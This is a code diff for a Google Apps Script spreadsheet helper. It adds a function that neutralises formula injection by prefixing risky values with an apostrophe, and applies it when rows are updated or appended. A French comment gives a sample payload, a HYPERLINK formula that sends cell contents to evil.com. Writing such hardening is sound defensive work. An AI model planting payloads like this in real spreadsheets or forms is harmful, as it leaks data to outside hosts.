@@ -10,6 +10,18 @@ function sheet_(tabName) {
   return SpreadsheetApp.getActiveSpreadsheet().getSheetByName(tabName);
 }
 
+/**
+ * Neutralise une injection de formule : une chaîne commençant par =, +, -
+ * ou @ serait interprétée par Sheets comme une formule dès que l'admin ouvre
+ * le classeur (ex. prénom = '=HYPERLINK("http://evil.com?"&A1)' saisi via un
+ * formulaire public). Le préfixe apostrophe force le type texte et reste
+ * invisible à l'affichage — comportement standard de Sheets.
+ */
+function sanitizeForSheet_(value) {
+  if (typeof value !== 'string') return value;
+  return /^[=+\-@]/.test(value) ? "'" + value : value;
+}
+
 function colIndex_(tabName, columnName) {
   return HEADERS[tabName].indexOf(columnName);
 }
@@ -44,7 +56,7 @@ function updateRow_(tabName, rowNumber, updates) {
   Object.keys(updates).forEach((col) => {
     const idx = headers.indexOf(col);
     if (idx === -1) throw new Error(`Colonne inconnue "${col}" dans ${tabName}`);
-    sh.getRange(rowNumber, idx + 1).setValue(updates[col]);
+    sh.getRange(rowNumber, idx + 1).setValue(sanitizeForSheet_(updates[col]));
   });
 }
 
@@ -52,7 +64,9 @@ function updateRow_(tabName, rowNumber, updates) {
 function appendRow_(tabName, rowObject) {
   const sh = sheet_(tabName);
   const headers = HEADERS[tabName];
-  const row = headers.map((h) => (Object.prototype.hasOwnProperty.call(rowObject, h) ? rowObject[h] : ''));
+  const row = headers.map((h) => sanitizeForSheet_(
+    Object.prototype.hasOwnProperty.call(rowObject, h) ? rowObject[h] : ''
+  ));
   sh.appendRow(row);
   return sh.getLastRow();
 }
